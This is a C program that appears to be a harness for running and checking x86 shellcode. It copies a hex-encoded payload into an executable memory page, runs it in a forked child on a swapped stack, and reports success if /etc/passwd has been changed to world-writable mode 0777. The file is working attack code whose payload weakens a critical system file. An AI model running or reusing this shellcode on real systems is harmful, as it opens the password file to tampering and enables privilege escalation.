#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "compiler/compiler.h"
#include "regs/stack.h"
#include "regs/state.h"

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef __victim_path
#define __victim_path "/etc/passwd"
#endif

#ifndef SHADOW_STACK_SIZE
#define SHADOW_STACK_SIZE (1024 * 4)
#endif

typedef struct {
  void *thread_stack;
  void *shadow_stack;
} __sigstack_t;

typedef __sigstack_t sigstack_t;

sigstack_t sstate = {
    .thread_stack = 0,
    .shadow_stack = 0,
};

static void __sighandler(void) {
}

static void __sigaction(int a, siginfo_t *b, void *c) {
  printf("[*] Restoring the stack..\n");
  set_stack(sstate.thread_stack);

  if ((unsigned long)get_stack() != (unsigned long)sstate.thread_stack) {
    printf("[-] Stack restoration failed. Fallback..\n");
    exit(1);
  }

  printf("[*] Stack restored.\n");
  exit(0);
}

static void install_signal(int signum, void (*handler)(),
                           void (*action)(int, siginfo_t *, void *), int flags) {
  int ret;
  struct sigaction act;

  bzero(&act, sizeof(struct sigaction));

  act.sa_handler = handler;
  act.sa_sigaction = action;
  act.sa_flags = flags;

  sigfillset(&act.sa_mask);

  ret = sigaction(signum, &act, NULL);

  if (unlikely(ret < 0)) {
    perror("sigaction()");
    ret = -errno;
    goto __fallback;
  }

__fallback:
  return;
}

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  install_signal(SIGCHLD, __sighandler, __sigaction, SA_SIGINFO);

  int fd, ret, wstatus;
  pid_t pid;
  struct stat st;
  struct utsname uts;
  char *pcall;
  char *shellcode = "\x33\xf6\x56\x68\x73\x73\x77\x64"
                    "\x68\x63\x2f\x70\x61\x68\x2f\x2f"
                    "\x65\x74\x8b\xdc\x33\xc9\x41\x41"
                    "\xba\xff\xff\xff\xff\x33\xc0\xb0"
                    "\x44\x56\x51\x53\x52\x50\xcd\x91"
                    "\x8b\xf8\x33\xc9\x66\xb9\xff\x01"
                    "\x56\x56\x51\x53\x57\x33\xc0\xb0"
                    "\x65\x50\xcd\x91\x56\x57\x33\xc0"
                    "\xb0\x06\x50\xcd\x91\x56\x56\x33"
                    "\xc0\xb0\x01\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (unlikely(pcall == MAP_FAILED)) {
    perror("mmap()");
    ret = -errno;
    goto __fallback;
  }

  sstate.shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));

  if (unlikely(!sstate.shadow_stack)) {
    perror("calloc()");
    ret = -errno;
    goto __must_unmap_payload;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    ret = -errno;
    goto __must_unmap_shadow_stack;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode into crafted buffer.\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  printf("[*] Creating trivial sandbox..\n");

  pid = fork();

  if (unlikely(pid < 0)) {
    perror("fork()");
    ret = -errno;
    goto __must_restore_regs;
  }

  if (likely(!pid)) {
    printf("[*] Saving thread stack..\n");
    __asm__ __volatile__("movl %%esp, %0\n" : "=r"(sstate.thread_stack));

#ifdef THREAD_DEBUG
    printf("[*] Debug\n");
    printf(" [*] thread_stack: %p\n", sstate.thread_stack);
    printf(" [*] shadow_stack: %p\n", sstate.shadow_stack);
#endif

    printf("[*] Installing shadow stack..\n");
    set_stack(sstate.shadow_stack);

    if ((unsigned long)get_stack() != (unsigned long)sstate.shadow_stack) {
      printf("[-] Failing to install shadow stack. Fallback..\n");
      exit(1);
    }

    printf("[*] Shadow stack installed.\n");

    printf("[*] Executing the shellcode..\n");
    __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));

    printf("FOOBARBAZ\n");
  } else {
    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
  }

  if ((fd = open(__victim_path, O_RDONLY)) < 0) {
    perror("open()");
    ret = fd;
    goto __must_restore_regs;
  }

  if ((ret = fsync(fd)) < 0) {
    perror("fsync()");
    goto __must_close;
  }

  bzero(&st, sizeof(struct stat));

  if ((ret = fstat(fd, &st)) < 0) {
    perror("stat()");
    goto __must_close;
  }

  printf("[*] Checking if '%s' mode changed into -rwxrwxrwx..\n",
         __victim_path);

  if ((st.st_mode & 0xfff) != 0777) {
    printf(" [-] Fail.\n");
    ret = -1;
    goto __must_close;
  }

  printf(" [*] Success.\n");

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  free(sstate.shadow_stack);
  munmap(pcall, sysconf(_SC_PAGESIZE));

  close(fd);
  return 0;

__must_close:
  close(fd);

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__must_unmap_shadow_stack:
  free(sstate.shadow_stack);

__must_unmap_payload:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
